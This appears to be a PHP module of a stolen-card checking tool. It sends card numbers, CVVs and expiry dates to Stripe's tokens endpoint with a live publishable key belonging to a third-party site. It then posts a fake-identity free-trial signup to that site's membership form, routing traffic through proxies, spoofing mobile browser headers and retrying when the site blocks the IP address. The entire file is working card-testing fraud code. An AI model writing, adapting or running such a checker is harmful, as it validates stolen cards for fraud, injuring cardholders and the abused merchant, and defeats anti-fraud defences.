<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$data = 'card[name]='.$fake->first.'+'.$fake->last.'&card[address_line1]=12+main+street&card[address_line2]=&card[address_city]=Brewster&card[address_state]=NY&card[address_zip]=10509&card[address_country]=United+States&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Ff79f90bea%3B+stripe-js-v3%2Ff79f90bea&time_on_page='.rand(50000, 100000).'&key=pk_live_EQDI7ypkXnHIXc4O2Uxl679M';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, null, $server['proxy']);

if (!$r1->success) {
	$empty = ''.$r1->error.'! ('.intval($r1->errno).')';

	goto start;
}

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;
$brand = $json_r1->card->brand;

$r2 = $this->curlx->Get('https://www.hoaleader.com/public/FREE-7Day-Trial-Membership-Form-ab.cfm', null, $cookie, $server['proxy']);

if (!$r2->success) {
	$empty = ''.$r2->error.'! ('.intval($r2->errno).')';

	goto start;
}

$data = 'title=&first_name='.$fake->first.'&last_name='.$fake->last.'&company=&member_job_title=&address=12+main+street&address2=&city=Brewster&country=United+States&state=NY&province=&postal_code=10509&email='.urlencode($fake->email).'&work_phone=&cellphone=&account_type_temp=24&account_type=24&userid='.$fake->user.'&useridvalidation=&password=CBAzyx321&passwordvalidation=&passcheck=CBAzyx321&renew=n&renewtype=site&send_email=y&pay_method='.$brand.'&stripeToken='.$tok.'&name_on_card='.$fake->first.'+'.$fake->last.'&must_agree=y&agreetemp=y&agree=yes';

$headers = [
	'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Accept-Language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'Cache-Control: max-age=0',
	'Connection: keep-alive',
	'Content-Type: application/x-www-form-urlencoded',
	'Origin: https://www.hoaleader.com',
	'Referer: https://www.hoaleader.com/public/FREE-7Day-Trial-Membership-Form-ab.cfm',
	'Sec-Fetch-Dest: document',
	'Sec-Fetch-Mode: navigate',
	'Sec-Fetch-Site: same-origin',
	'Sec-Fetch-User: ?1',
	'Upgrade-Insecure-Requests: 1',
	'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"'
];

$r3 = $this->curlx->Post('https://www.hoaleader.com/public/programs/newmember.cfm', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success || empty($r3->body)) {
	$empty = empty($r3->body) ? 'Response of The Third Request was Empty' : ''.$r3->error.'! ('.intval($r3->errno).')';

	goto start;
}

if (strpos($r3->body, 'Your IP Address Has Been Blocked') !== false) {
	$empty = 'Your IP Address Has Been Blocked';

	goto start;
}

$message = trim(strip_tags($this->getstr($r3->body, '<cfoutput>', '</cfoutput>')));

$status = $this->response->Stripe($r3->body, $message, 'auth');

end: